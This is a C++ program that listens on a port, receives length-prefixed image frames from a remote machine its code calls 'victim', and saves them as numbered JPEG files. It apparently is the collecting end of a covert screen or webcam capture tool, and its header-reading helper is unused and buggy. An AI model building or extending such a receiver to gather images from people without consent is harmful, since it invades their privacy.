#include <iostream>
#include "connections.hpp"
#include <vector>
#include <cstring>
#include <string>
#include <opencv2/opencv.hpp>
#define port "23112"
unsigned int frame_number = 0;

bool try_to_get_image(std::vector<char> buffer)
{
    cv::Mat img;
    img = cv::imdecode(cv::Mat(1, buffer.size(), CV_8UC1, (uchar *)buffer.data()), cv::IMREAD_UNCHANGED);
    if (img.data == NULL)
    {
        return false;
    }
    if (!img.empty())
    {
        frame_number++;
        std::string path = "C:\\frames_grabbed\\frame";
        path+= std::to_string(frame_number);
        path+= ".jpg";
        cv::imwrite(path,img);
        return true;
    }
    else
    {
        return false;
    }
}

bool get_header(int socket, std::uint64_t *var)
{

    size_t offset = 0;
    char *buffer = reinterpret_cast<char *>(var);
    while (true)
    {
        int r = recv(socket, buffer + offset, sizeof(var) - offset, 0);
        std::cout << r << std::endl;
        if (r < 0)
        {
            if (errno == EINTR)
                continue;
            else
                error("no se pudo leer", WSAGetLastError());
        }
        else if (r == 0)
        {
            error("se corto la conexion", WSAGetLastError());
        }
        else if (offset + r == sizeof(var))
        {
            return true;
        }
        offset += r;
    }
    return false;
}

int main()
{
    SOCKET victim = connect_to_client(port);
    int r = 0;
    while (true)
    {
        size_t size;
        char size_buffer[8];
        if (recv(victim, size_buffer, 8, MSG_WAITALL) < 0)
        {
            error("no se pudo obtener el header", WSAGetLastError());
        };
        memcpy(&size, size_buffer, 8);
        std::cout << "SIZE: " << size << std::endl;
        std::vector<char> buffer(size);
        r = recv(victim, buffer.data(), buffer.size(), MSG_WAITALL);
        if (r < 0)
        {
            error("no se pudo obtener la imagen", WSAGetLastError());
        }
        if (!try_to_get_image(buffer))
        {
            error("no se pudo interpretar los datos", -1);
        }
    }

    return 0;
}
